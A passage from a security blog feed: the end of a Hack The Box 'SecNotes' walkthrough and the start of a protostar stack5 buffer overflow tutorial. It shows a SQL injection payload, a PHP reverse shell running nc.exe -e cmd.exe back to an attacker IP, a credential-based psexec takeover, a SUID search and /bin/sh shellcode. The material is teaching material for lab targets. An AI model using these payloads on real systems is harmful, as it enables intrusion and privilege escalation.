&lt;hr /&gt;

&lt;h3 id=&quot;new-site&quot;&gt;New Site&lt;/h3&gt;
&lt;h4 id=&quot;we-will-login-with-smbclient-&quot;&gt;We will login with smbclient :&lt;/h4&gt;
&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;smbclient //secnotes.htb/new-site -U &quot;tyler&quot;&lt;/code&gt;&lt;/p&gt;
&lt;h4 id=&quot;then-we-will-look-at-the-contents-of-that-share-with-ls&quot;&gt;Then we will look at the contents of that share with &lt;code class=&quot;highlighter-rouge&quot;&gt;ls&lt;/code&gt;&lt;/h4&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;smb: \&amp;gt; ls
  .                                   D        0  Fri Jan 18 15:25:52 2019
  ..                                  D        0  Fri Jan 18 15:25:52 2019
  iisstart.htm                        A      696  Thu Jun 21 17:26:03 2018
  iisstart.png                        A    98757  Thu Jun 21 17:26:03 2018
  Microsoft                           D        0  Fri Jan 18 15:25:52 2019

&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;h4 id=&quot;we-see-stuff-that-is-related-to-an-http-server--but-thats-not-the-server-on-port-80--because-it-had-more-than-just-a-png-picture-and-html-page-if-we-do-another-full-port-scan-we-will-find-an-http-server-on-port-8808&quot;&gt;We see stuff that is related to an http server , but that’s not the server on port 80 , because it had more than just a png picture and html page. If we do another full port scan we will find an http server on port 8808.&lt;/h4&gt;
&lt;h4 id=&quot;you-can-do-a-full-scan-by-specifying-the-port-range-like-this--p--i-already-know-its-port-8808-so-im-going-to-scan-that-port&quot;&gt;you can do a full scan by specifying the port range like this &lt;code class=&quot;highlighter-rouge&quot;&gt;-p-&lt;/code&gt; I already know it’s port 8808 so i’m going to scan that port&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/secnotes/8.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;now-if-we-go-to-that-port-we-will-see-a-default-page-&quot;&gt;Now if we go to that port we will see a default page :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/secnotes/9.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;and-by-looking-at-the-source-we-see-the-png-image-we-saw-earlier-on-the-smb-share&quot;&gt;And by looking at the source we see the png image we saw earlier on the smb share.&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/secnotes/10.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;so-we-can-upload-our-shell-to-that-server-through-smb-then-easily-get-a-reverse-shell&quot;&gt;So we can upload our shell to that server through smb then easily get a reverse shell.&lt;/h4&gt;
&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
&lt;hr /&gt;

&lt;h3 id=&quot;reverse-shell-and-user&quot;&gt;Reverse shell and User&lt;/h3&gt;
&lt;h4 id=&quot;we-will-create-a-simple-php-file-that-executes-ncexe-and-connects-back-to-us-&quot;&gt;We will create a simple php file that executes nc.exe and connects back to us :&lt;/h4&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&amp;lt;?php
system('nc.exe -e cmd.exe 10.10.xx.xx 1337')
?&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;h4 id=&quot;then-we-will-put-it-on-the-server--from-smb-shell-we-do-put-revphp-we-also-need-ncexe--you-can-get-it-from-here-then-we-will-do-put-ncexe&quot;&gt;Then we will put it on the server : from smb shell we do &lt;code class=&quot;highlighter-rouge&quot;&gt;put rev.php&lt;/code&gt; we also need nc.exe . you can get it from &lt;a href=&quot;https://eternallybored.org/misc/netcat/&quot;&gt;here&lt;/a&gt; then we will do &lt;code class=&quot;highlighter-rouge&quot;&gt;put nc.exe&lt;/code&gt;&lt;/h4&gt;
&lt;h4 id=&quot;now-when-we-visit-secnoteshtb8808revphp-our-listener-should-get-a-callback--and-we-got-a-rev-shell-&quot;&gt;Now when we visit secnotes.htb:8808/rev.php our listener should get a callback , and we got a rev shell !&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/secnotes/11.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;hr /&gt;

&lt;h3 id=&quot;wsl&quot;&gt;WSL&lt;/h3&gt;
&lt;h4 id=&quot;lets-take-a-look-at-the-admins-desktop&quot;&gt;Let’s take a look at the admin’s Desktop&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/secnotes/12.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;there-are-some-interesting-stuff--but-bashlnk-thats-weird-because-we-are-on-a-windows-machine--so-windows-subsystem-for-linux-is-installed-on-this-machine-lets-find-where-is-bashexe&quot;&gt;There are some interesting stuff , but &lt;code class=&quot;highlighter-rouge&quot;&gt;bash.lnk&lt;/code&gt; that’s weird because we are on a windows machine , so windows subsystem for linux is installed on this machine. Let’s find where is bash.exe&lt;/h4&gt;
&lt;h4 id=&quot;we-will-cd-windows-then-we-will-do-dir-exe-bs--findstr-bash-and-this-will-list-recursively-all-the-exe-files-then-we-will-just-pick-the-line-that-has-bash-in-it--findstr-is-like-grep-in-linux&quot;&gt;We will &lt;code class=&quot;highlighter-rouge&quot;&gt;cd /windows&lt;/code&gt; then we will do &lt;code class=&quot;highlighter-rouge&quot;&gt;dir *.exe /b/s | findstr bash&lt;/code&gt; and this will list recursively all the exe files then we will just pick the line that has bash in it , &lt;code class=&quot;highlighter-rouge&quot;&gt;findstr&lt;/code&gt; is like &lt;code class=&quot;highlighter-rouge&quot;&gt;grep&lt;/code&gt; in linux&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/secnotes/13.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;and-we-got-the-path--lets-cd-to-it-and-execute-bashexe&quot;&gt;And we got the path , let’s &lt;code class=&quot;highlighter-rouge&quot;&gt;cd&lt;/code&gt; to it and execute bash.exe&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/secnotes/14.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;we-will-get-a-stable-shell-with-python-pty--we-see-that-we-are-root-on-this-subsystem-if-we-list-the-files-in-root-directory-we-dont-see-too-much-files--but-we-see-bash_history-which-is-a-very-interesting-thing-to-look-at-if-you-are-enumerating-a-linux-box-so-lets-view-that&quot;&gt;We will get a stable shell with python pty , We see that we are root on this subsystem. if we list the files in &lt;code class=&quot;highlighter-rouge&quot;&gt;/root&lt;/code&gt; directory we don’t see too much files , but we see &lt;code class=&quot;highlighter-rouge&quot;&gt;.bash_history&lt;/code&gt; which is a very interesting thing to look at if you are enumerating a linux box so let’s view that.&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/secnotes/15.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;hr /&gt;

&lt;h3 id=&quot;root&quot;&gt;Root&lt;/h3&gt;
&lt;h4 id=&quot;theres-an-smbclient-command-with-the-administrator-creds-we-will-simply-use-impackets-psexecpy-to-get-a-root-shell--like-we-did-in-active&quot;&gt;There’s an smbclient command with the administrator creds, we will simply use &lt;a href=&quot;https://github.com/SecureAuthCorp/impacket&quot;&gt;impacket&lt;/a&gt;’s &lt;code class=&quot;highlighter-rouge&quot;&gt;psexec.py&lt;/code&gt; to get a root shell , like we did in &lt;a href=&quot;/hack-the-box/active/&quot;&gt;Active&lt;/a&gt;&lt;/h4&gt;
&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;./psexec.py administrator@secnotes.htb&lt;/code&gt;
&lt;img src=&quot;/images/hackthebox/secnotes/16.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;and-we-owned-root&quot;&gt;And we owned root!&lt;/h4&gt;
&lt;p&gt;&lt;br /&gt;
&lt;br /&gt;&lt;/p&gt;
&lt;h4 id=&quot;thats-it--feedback-is-appreciated-&quot;&gt;That’s it , Feedback is appreciated !&lt;/h4&gt;
&lt;h4 id=&quot;dont-forget-to-read-the-previous-write-ups--tweet-about-the-write-up-if-you-liked-it--follow-on-twitter-for-awesome-resources-ahm3d_h3sham&quot;&gt;Don’t forget to read the &lt;a href=&quot;/categories&quot;&gt;previous write-ups&lt;/a&gt; , Tweet about the write-up if you liked it , follow on twitter for awesome resources &lt;a href=&quot;https://twitter.com/Ahm3d_H3sham&quot;&gt;@Ahm3d_H3sham&lt;/a&gt;&lt;/h4&gt;
&lt;h4 id=&quot;thanks-for-reading&quot;&gt;Thanks for reading.&lt;/h4&gt;
&lt;p&gt;&lt;br /&gt;
&lt;br /&gt;&lt;/p&gt;
&lt;h4 id=&quot;previous-hack-the-box-write-up--hack-the-box---oz&quot;&gt;previous Hack The Box write-up : &lt;a href=&quot;/hack-the-box/oz/&quot;&gt;Hack The Box - Oz&lt;/a&gt;&lt;/h4&gt;
&lt;h4 id=&quot;next-hack-the-box-write-up--hack-the-box---dab&quot;&gt;next Hack The Box write-up : &lt;a href=&quot;/hack-the-box/dab/&quot;&gt;Hack The Box - Dab&lt;/a&gt;&lt;/h4&gt;
&lt;hr /&gt;</content><author><name></name></author><summary type="html">Quick Summary Hey guys Today SecNotes retired. SecNotes was a very nice box and I really liked that it mixed between windows and linux , and that’s because it was a windows box and it had windows subsystem for linux (WSL) installed.It was relatively easy. It’s ip is 10.10.10.97 so let’s jump right in. Nmap We will start with scanning open ports and services with nmap like we always do so nmap -sV -sT secnotes.htb And we see http on port 80 and microsoft-ds on 445 which is smb actually. So let’s look at what’s there on http HTTP A regular login page and there is an option to sign up , So let’s sign up and see what’s in there. After we login we see this regular page : “Viewing Secure Notes for Username” , and there are some options like creating a note , changing password , sign out and contact. Of course we will do regular enumeration like checking for directories ,checking web vulnerabilities and stuff like that but i will just jump into the thing. SQLI If we tried to do sql injection in the registration form , it will work after we login (second order sqli). A simple payload like OR 1 OR : And after we login we see some notes , most importantly “new site” : We smb creds , so the next step is to login with smbclient New Site We will login with smbclient : smbclient //secnotes.htb/new-site -U &quot;tyler&quot; Then we will look at the contents of that share with ls smb: \&amp;gt; ls . D 0 Fri Jan 18 15:25:52 2019 .. D 0 Fri Jan 18 15:25:52 2019 iisstart.htm A 696 Thu Jun 21 17:26:03 2018 iisstart.png A 98757 Thu Jun 21 17:26:03 2018 Microsoft D 0 Fri Jan 18 15:25:52 2019 We see stuff that is related to an http server , but that’s not the server on port 80 , because it had more than just a png picture and html page. If we do another full port scan we will find an http server on port 8808. you can do a full scan by specifying the port range like this -p- I already know it’s port 8808 so i’m going to scan that port Now if we go to that port we will see a default page : And by looking at the source we see the png image we saw earlier on the smb share. So we can upload our shell to that server through smb then easily get a reverse shell. Reverse shell and User We will create a simple php file that executes nc.exe and connects back to us : &amp;lt;?php system('nc.exe -e cmd.exe 10.10.xx.xx 1337') ?&amp;gt; Then we will put it on the server : from smb shell we do put rev.php we also need nc.exe . you can get it from here then we will do put nc.exe Now when we visit secnotes.htb:8808/rev.php our listener should get a callback , and we got a rev shell ! WSL Let’s take a look at the admin’s Desktop There are some interesting stuff , but bash.lnk that’s weird because we are on a windows machine , so windows subsystem for linux is installed on this machine. Let’s find where is bash.exe We will cd /windows then we will do dir *.exe /b/s | findstr bash and this will list recursively all the exe files then we will just pick the line that has bash in it , findstr is like grep in linux And we got the path , let’s cd to it and execute bash.exe We will get a stable shell with python pty , We see that we are root on this subsystem. if we list the files in /root directory we don’t see too much files , but we see .bash_history which is a very interesting thing to look at if you are enumerating a linux box so let’s view that. Root There’s an smbclient command with the administrator creds, we will simply use impacket’s psexec.py to get a root shell , like we did in Active ./psexec.py administrator@secnotes.htb And we owned root! That’s it , Feedback is appreciated ! Don’t forget to read the previous write-ups , Tweet about the write-up if you liked it , follow on twitter for awesome resources @Ahm3d_H3sham Thanks for reading. previous Hack The Box write-up : Hack The Box - Oz next Hack The Box write-up : Hack The Box - Dab</summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="http://localhost:4000/hackthebox/secnotes/0.png" /></entry><entry><title type="html">Buffer Overflow Practical Examples , Shellcode Injection and Local Privilege Escalation - protostar stack5</title><link href="http://localhost:4000/binary-exploitation/bof5/" rel="alternate" type="text/html" title="Buffer Overflow Practical Examples , Shellcode Injection and Local Privilege Escalation - protostar stack5" /><published>2019-01-17T00:00:00+02:00</published><updated>2019-01-17T00:00:00+02:00</updated><id>http://localhost:4000/binary-exploitation/bof5</id><content type="html" xml:base="http://localhost:4000/binary-exploitation/bof5/">&lt;hr /&gt;

&lt;h3 id=&quot;introduction&quot;&gt;Introduction&lt;/h3&gt;
&lt;h4 id=&quot;hey-im-back-with-another-buffer-overflow-article-and-today-we-are-going-to-do-a-really-interesting-exploit--today-we-will-finally-escalate-privileges-using-a-vulnerable-suid-binary-you-can-know-more-about-that-by-reading-the-first-buffer-overflow-article--i-will-also-cover-some-interesting-topics-to-fully-understand-this-exploit-this-is-also-the-most-realistic-exploit-so-far-all-the-previous-exploits-wanted-us-to-change-a-variable--execute-a-function--stuff-that-are-more-like-ctf-but-this-time-we-have-a-realistic-situation--without-wasting-more-time-lets-just-jump-right-in&quot;&gt;Hey I’m back with another Buffer Overflow article and today we are going to do a really interesting exploit , Today we will finally escalate privileges using a vulnerable suid binary (you can know more about that by reading the &lt;a href=&quot;/binary-exploitation/bof1/&quot;&gt;first buffer overflow article&lt;/a&gt;) , I will also cover some interesting topics to fully understand this exploit. This is also the most realistic exploit so far. All the previous exploits wanted us to change a variable , execute a function .. stuff that are more like CTF but this time we have a realistic situation , Without wasting more time let’s just jump right in.&lt;/h4&gt;
&lt;h4 id=&quot;read-the-previous-articles-first--if-you-havent-done-yet&quot;&gt;Read the &lt;a href=&quot;/categories&quot;&gt;previous articles&lt;/a&gt; first , if you haven’t done yet.&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/binary-exploitation/BOF5/0.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;hr /&gt;

&lt;h3 id=&quot;stack5&quot;&gt;./Stack5&lt;/h3&gt;
&lt;h4 id=&quot;we-have-the-source-like-all-the-previous-challenges-but-this-time-its-actually-not-important&quot;&gt;We have the source like all the previous challenges but this time it’s actually not important.&lt;/h4&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;#include &amp;lt;stdlib.h&amp;gt;
#include &amp;lt;unistd.h&amp;gt;
#include &amp;lt;stdio.h&amp;gt;
#include &amp;lt;string.h&amp;gt;

int main(int argc, char **argv)
{
 char buffer[64];

 gets(buffer);
}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;h4 id=&quot;it-just-takes-our-input-and-stores-it-in-the-buffer--it-doesnt-even-tell-us-about-the-buffer-size-what-about-char-buffer64---like-stack4-if-we-tried-64-chars-it-wont-even-crash-with-that-being-said-lets-start&quot;&gt;It just takes our input and stores it in the buffer , it doesn’t even tell us about the buffer size. What about &lt;code class=&quot;highlighter-rouge&quot;&gt;char buffer[64];&lt;/code&gt; ?  like &lt;a href=&quot;/binary-exploitation/bof4/&quot;&gt;stack4&lt;/a&gt; if we tried 64 chars it won’t even crash. with that being said let’s start.&lt;/h4&gt;
&lt;h4 id=&quot;as-always-we-will-start-by-finding-out-if-the-binary-vulnerable-or-not-yea-we-already-know-that-but-its-an-important-enumeration-step&quot;&gt;As always we will start by finding out if the binary vulnerable or not (yea we already know that but it’s an important enumeration step)&lt;/h4&gt;
&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;python -c &quot;print 'A' * 100&quot; | ./stack5&lt;/code&gt;
&lt;img src=&quot;/images/binary-exploitation/BOF5/1.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;segmentation-fault-so-it-crashes-before-100-chars--next-step-is-to-know-where-exactly-does-it-crash-we-will-use-metasploit-pattern_create-and-pattern_offset--i-explained-how-does-this-work-in-stack3&quot;&gt;Segmentation fault. So it crashes before 100 chars , next step is to know where exactly does it crash. We will use metasploit &lt;code class=&quot;highlighter-rouge&quot;&gt;pattern_create&lt;/code&gt; and &lt;code class=&quot;highlighter-rouge&quot;&gt;pattern_offset&lt;/code&gt; , I explained how does this work in &lt;a href=&quot;/binary-exploitation/bof3&quot;&gt;stack3&lt;/a&gt;&lt;/h4&gt;
&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;./pattern_create.rb -l 100&lt;/code&gt;
&lt;img src=&quot;/images/binary-exploitation/BOF5/2.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;then-we-will-run-gdb-and-create-a-break-point-at-main--run-the-program-after-the-break-point-we-make-it-continue-then-pass-our-pattern&quot;&gt;Then we will run gdb and create a break point at &lt;code class=&quot;highlighter-rouge&quot;&gt;main()&lt;/code&gt; , &lt;code class=&quot;highlighter-rouge&quot;&gt;run&lt;/code&gt; the program after the break point we make it continue then pass our pattern&lt;/h4&gt;
&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;break main&lt;/code&gt;
&lt;br /&gt;
&lt;code class=&quot;highlighter-rouge&quot;&gt;run&lt;/code&gt;
&lt;br /&gt;
&lt;code class=&quot;highlighter-rouge&quot;&gt;c&lt;/code&gt;
&lt;img src=&quot;/images/binary-exploitation/BOF5/3.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;it-crashes-at-0x63413563--now-we-will-use-pattern_offset&quot;&gt;It crashes at &lt;code class=&quot;highlighter-rouge&quot;&gt;0x63413563&lt;/code&gt; , now we will use &lt;code class=&quot;highlighter-rouge&quot;&gt;pattern_offset&lt;/code&gt;&lt;/h4&gt;
&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;./pattern_offset.rb -q 63413563&lt;/code&gt;
&lt;img src=&quot;/images/binary-exploitation/BOF5/4.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;and-we-get-exact-match-at-offset-76-as-i-said-before-we-will-exploit-this-binary-to-get-a-root-shell--but-how-to-know-if-its-a-suid-binary-or-not--we-can-simply-use-find-to-know-that&quot;&gt;And we get exact match at offset 76. As I said before we will exploit this binary to get a root shell , but how to know if it’s a suid binary or not ? we can simply use &lt;code class=&quot;highlighter-rouge&quot;&gt;find&lt;/code&gt; to know that&lt;/h4&gt;
&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;find /opt/protostar/bin/ -perm -4000 | grep stack5&lt;/code&gt;
&lt;img src=&quot;/images/binary-exploitation/BOF5/5.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;and-we-get-optprotostarbinstack5--if-it-wasnt-a-suid-binary-we-wouldnt-get-any-output-if-you-are-just-searching-for-suid-binaries-you-can-remove-the-grep-command-and-it-will-list-all-suid-binaries-in-the-specified-directory&quot;&gt;And we get &lt;code class=&quot;highlighter-rouge&quot;&gt;/opt/protostar/bin/stack5&lt;/code&gt; , if it wasn’t a suid binary we wouldn’t get any output. If you are just searching for suid binaries you can remove the &lt;code class=&quot;highlighter-rouge&quot;&gt;grep&lt;/code&gt; command and it will list all suid binaries in the specified directory.&lt;/h4&gt;
&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
&lt;hr /&gt;

&lt;h3 id=&quot;fun-with-gdb--finding-eip&quot;&gt;Fun with gdb , finding EIP&lt;/h3&gt;
&lt;h4 id=&quot;now-lets-run-gdb-again-and-start-getting-useful-information-before-we-start-i-have-to-say-that-the-memory-addresses-may-differ--so-mine-wont-be-the-same-as-yours-last-time-we-have-overwritten-the-eip-address-with-the-address-of-win-function--this-time-we-dont-have-a-function-to-execute-we-have-to-find-the-address-of-the-eip-and-make-it-point-to-our-evil-input-shellcode-i-will-explain-in-a-moment&quot;&gt;Now let’s run gdb again and start getting useful information. Before we start I have to say that the memory addresses may differ , so mine won’t be the same as yours. Last time we have overwritten the EIP address with the address of &lt;code class=&quot;highlighter-rouge&quot;&gt;win()&lt;/code&gt; function . This time we don’t have a function to execute ,we have to find the address of the EIP and make it point to our “evil input” (shellcode), I will explain in a moment.&lt;/h4&gt;
&lt;h4 id=&quot;we-will-set-the-disassembly-flavor-to-intel&quot;&gt;We will set the disassembly flavor to intel&lt;/h4&gt;
&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;set disassembly-flavor intel&lt;/code&gt;&lt;/p&gt;
&lt;h4 id=&quot;then-we-will-disassemble-the-main-function&quot;&gt;Then we will disassemble the main function&lt;/h4&gt;
&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;disassemble main&lt;/code&gt;
&lt;img src=&quot;/images/binary-exploitation/BOF5/6.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;by-looking-at-that-we-can-identify-the-best-place-to-set-our-break-point--and-its-gonna-be-before-the-leave-instruction--leave-is-right-before-the-return-instruction--next-to-leave-we-see-the-address-0x080483d9-so-we-will-type-&quot;&gt;By looking at that we can identify the best place to set our break point , and it’s gonna be before the &lt;code class=&quot;highlighter-rouge&quot;&gt;leave&lt;/code&gt; instruction , &lt;code class=&quot;highlighter-rouge&quot;&gt;leave&lt;/code&gt; is right before the &lt;code class=&quot;highlighter-rouge&quot;&gt;return&lt;/code&gt; instruction , next to &lt;code class=&quot;highlighter-rouge&quot;&gt;leave&lt;/code&gt; we see the address &lt;code class=&quot;highlighter-rouge&quot;&gt;0x080483d9&lt;/code&gt; so we will type :&lt;/h4&gt;
&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;break *0x080483d9&lt;/code&gt;
&lt;img src=&quot;/images/binary-exploitation/BOF5/7.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;then-we-will-run-the-program-and-pass-any-input--many-as-is-always-good&quot;&gt;Then we will run the program and pass any input , many A’s is always good&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/binary-exploitation/BOF5/8.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;it-will-execute-and-stop-at-the-breakpoint--by-typing-info-frame-we-can-get-the-eip-address&quot;&gt;It will execute and stop at the breakpoint , by typing &lt;code class=&quot;highlighter-rouge&quot;&gt;info frame&lt;/code&gt; we can get the EIP address&lt;/h4&gt;
&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;info frame&lt;/code&gt;
&lt;img src=&quot;/images/binary-exploitation/BOF5/9.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;the-last-2-lines-show-saved-registers--eip-at-0xbffff77c&quot;&gt;The last 2 lines show saved registers : eip at &lt;code class=&quot;highlighter-rouge&quot;&gt;0xbffff77c&lt;/code&gt;&lt;/h4&gt;
&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
&lt;hr /&gt;

&lt;h3 id=&quot;another-way-to-get-the-buffer-size&quot;&gt;Another way to get the buffer size&lt;/h3&gt;
&lt;h4 id=&quot;lets-take-a-break-and-take-a-quick-look-at-another-way-to-get-the-buffer-size--i-wanted-to-show-this-quickly-because-we-have-already-done-50--of-it-&quot;&gt;Let’s take a break and take a quick look at another way to get the buffer size , I wanted to show this quickly because we have already done 50 % of it ..&lt;/h4&gt;
&lt;h4 id=&quot;metasploit-is-cool-but-what-if-we-dont-have-metasploit-in-some-situation--we-can-do-it-manually-by-calculating-the-distance-between-the-buffer-start-address-and-the-eip-address--we-have-already-got-the-eip-address-so-lets-get-the-start-of-the-buffer&quot;&gt;Metasploit is cool but what if we don’t have metasploit in some situation ? We can do it manually by calculating the distance between the buffer start address and the EIP address , We have already got the EIP address so let’s get the start of the buffer.&lt;/h4&gt;
&lt;h4 id=&quot;if-we-type-x24wx-esp-it-will-show-us-x-24-24wx-words-at-the-top-of-the-stack-esp&quot;&gt;If we type &lt;code class=&quot;highlighter-rouge&quot;&gt;x/24wx $esp&lt;/code&gt; it will show us (&lt;code class=&quot;highlighter-rouge&quot;&gt;x/&lt;/code&gt;) 24 (&lt;code class=&quot;highlighter-rouge&quot;&gt;24wx&lt;/code&gt;) words at the top of the stack (&lt;code class=&quot;highlighter-rouge&quot;&gt;$esp&lt;/code&gt;).&lt;/h4&gt;
&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;x/24wx $esp&lt;/code&gt;
&lt;img src=&quot;/images/binary-exploitation/BOF5/10.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;at-the-second-line-we-see-this-address-0xbffff730-and-it-holds-values-of-0x41414141-and-we-already-know-that-41-is-the-hex-of-a-which-was-our-input-to-the-program-so-we-know-that-this-address-is-where-the-buffer-starts-we-know-that-the-buffer-comes-first-then-the-eip-so-the-eips-address-is-greater-than-the-buffers-address-we-will-substract-them-from-each-other&quot;&gt;At the second line we see this address &lt;code class=&quot;highlighter-rouge&quot;&gt;0xbffff730&lt;/code&gt; and it holds values of &lt;code class=&quot;highlighter-rouge&quot;&gt;0x41414141&lt;/code&gt; and we already know that 41 is the hex of “A” which was our input to the program so we know that this address is where the buffer starts. We know that the buffer comes first then the EIP so the EIP’s address is greater than the buffer’s address. We will substract them from each other:&lt;/h4&gt;
&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;p/d 0xbffff77c - 0xbffff730&lt;/code&gt;
&lt;img src=&quot;/images/binary-exploitation/BOF5/11.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;and-we-get-76--the-same-result-we-got-using-metasploit-that-was-another-practical-way-to-find-the-buffers-size&quot;&gt;And we get 76 , the same result we got using metasploit. That was another practical way to find the buffer’s size.&lt;/h4&gt;
&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
&lt;hr /&gt;

&lt;h3 id=&quot;idea-of-the-exploit&quot;&gt;Idea of the exploit&lt;/h3&gt;
&lt;h4 id=&quot;before-we-build-our-exploit-lets-just-understand-the-idea-of-the-exploit-we-will-fill-the-buffer-with-a-as-always--we-will-reach-the-eip-and-overwrite-it-with-a-new-address-that-points-to-our-shell-code-4-bytes-after-then-we-will-add-something-called-nop-no-operation--then-finally-the-shellcode-lets-breakdown-everything&quot;&gt;before we build our exploit let’s just understand the idea of the exploit. we will fill the buffer with “A” as always , we will reach the EIP and overwrite it with a new address that points to our shell code (4 bytes after), then we will add something called NOP (No Operation) , then finally the shellcode. Let’s breakdown everything.&lt;/h4&gt;
&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
&lt;hr /&gt;

&lt;h3 id=&quot;shellcode&quot;&gt;ShellCode&lt;/h3&gt;
&lt;h4 id=&quot;so-whats-a-shellcode--simply-its-a-piece-of-code-written-in-hex-in-our-situation-that-we-use-as-a-payload-to-execute-something--binsh-for-example-and-this-binary-is-suid--so-if-we-execute-shellcode-that-executes-binsh-with-the-binary-we-will-get-a-root-shell&quot;&gt;So what’s a shellcode ? Simply it’s a piece of code (“written in hex in our situation”) that we use as a payload to execute something . &lt;code class=&quot;highlighter-rouge&quot;&gt;/bin/sh&lt;/code&gt; for example. And this binary is suid … so if we execute shellcode that executes &lt;code class=&quot;highlighter-rouge&quot;&gt;/bin/sh&lt;/code&gt; with the binary we will get a root shell.&lt;/h4&gt;
&lt;h4 id=&quot;you-can-get-shellcodes-from-shell-storm-or-from-exploit-db--of-course-there-are-a-lot-of-other-resources--im-just-giving-examples&quot;&gt;You can get shellcodes from &lt;a href=&quot;http://shell-storm.org/shellcode/&quot;&gt;shell-storm&lt;/a&gt; or from &lt;a href=&quot;https://www.exploit-db.com/&quot;&gt;exploit-db&lt;/a&gt; , of course there are a lot of other resources , I’m just giving examples.&lt;/h4&gt;
&lt;h4 id=&quot;this-is-the-shellcode-we-are-going-to-use-for-this-challenge-&quot;&gt;This is the &lt;a href=&quot;https://www.exploit-db.com/exploits/13357&quot;&gt;shellcode&lt;/a&gt; we are going to use for this challenge :&lt;/h4&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;\x31\xc0\x31\xdb\xb0\x06\xcd\x80\x53\x68/tty\x68/dev\x89\xe3\x31\xc9\x66\xb9\x12\x27\xb0\x05\xcd\x80\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;h4 id=&quot;this-shellcode-executes-binsh&quot;&gt;This shellcode executes &lt;code class=&quot;highlighter-rouge&quot;&gt;/bin/sh&lt;/code&gt;&lt;/h4&gt;
&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
&lt;hr /&gt;

&lt;h3 id=&quot;nop-no-operation&quot;&gt;NOP (No Operation)&lt;/h3&gt;
